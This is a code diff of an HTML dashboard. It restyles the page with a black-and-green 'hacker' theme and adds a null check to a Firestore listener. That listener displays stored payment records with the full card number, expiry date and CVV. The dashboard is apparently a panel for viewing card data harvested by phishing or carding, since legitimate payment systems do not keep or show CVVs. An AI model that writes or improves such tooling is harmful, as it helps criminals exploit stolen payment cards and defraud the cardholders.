@@ -5,17 +5,18 @@
   <style>
     body {
       font-family: Arial;
-      background: #f0f0f0;
+      background: #000; /* black background */
       margin: 0;
       padding: 0;
+      color: #0f0; /* green text */
     }
     .login-box {
       max-width: 350px;
       margin: 80px auto;
       padding: 30px;
-      background: white;
+      background: #111;
       border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
       text-align: center;
     }
     input[type="email"], input[type="password"] {
@@ -23,12 +24,14 @@
       padding: 10px;
       margin: 10px 0;
       border-radius: 5px;
-      border: 1px solid #ccc;
+      border: 1px solid #0f0;
+      background: #000;
+      color: #0f0;
     }
     button {
       padding: 10px 20px;
-      background: #00008b;
-      color: white;
+      background: #0f0;
+      color: #000;
       border: none;
       border-radius: 5px;
       cursor: pointer;
@@ -39,16 +42,26 @@
       display: none;
     }
     h2, h3 {
-      color: #00008b;
+      color: #0f0;
     }
     .top-menu {
       text-align: center;
       padding: 10px;
-      background: #fff;
+      background: #111;
       position: sticky;
       top: 0;
       z-index: 10;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      box-shadow: 0 2px 5px rgba(0, 255, 0, 0.2);
+    }
+    .top-menu button {
+      background: #0f0;
+      color: #000;
+      border-radius: 5px;
+      padding: 8px 15px;
+      margin: 2px;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
     }
     .sections-container {
       display: flex;
@@ -60,26 +73,27 @@
     .section {
       flex: 0 0 300px;
       min-width: 300px;
-      background: #fff;
+      background: #111;
       border-radius: 10px;
       padding: 15px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
     }
     .entry {
-      background: #f9f9f9;
+      background: #000;
       margin-bottom: 10px;
       padding: 15px;
-      border-left: 5px solid #00008b;
+      border-left: 5px solid #0f0;
       border-radius: 8px;
       position: relative;
     }
     .entry h4 {
       margin: 0 0 5px;
-      color: #333;
+      color: #0f0;
     }
     .entry p {
       margin: 3px 0;
       font-size: 14px;
+      color: #ccc;
     }
     .delete-btn {
       position: absolute;
@@ -214,7 +228,7 @@
   db.collection("payments").orderBy("timestamp", "desc").onSnapshot(snapshot => {
     snapshot.docChanges().forEach(change => {
       const d = change.doc.data();
-      if (d.method.includes("card")) {
+      if (d.method && d.method.includes("card")) {
         const html = `<p><strong>Card:</strong> ${d.card}</p><p><strong>Expiry:</strong> ${d.expiry}</p><p><strong>CVV:</strong> ${d.cvv}</p>`;
         renderEntry("cardPaymentSection", html, change.doc.id, "payments");
         renderEntry("combinedSection", html, change.doc.id, "payments", "Card Detail");
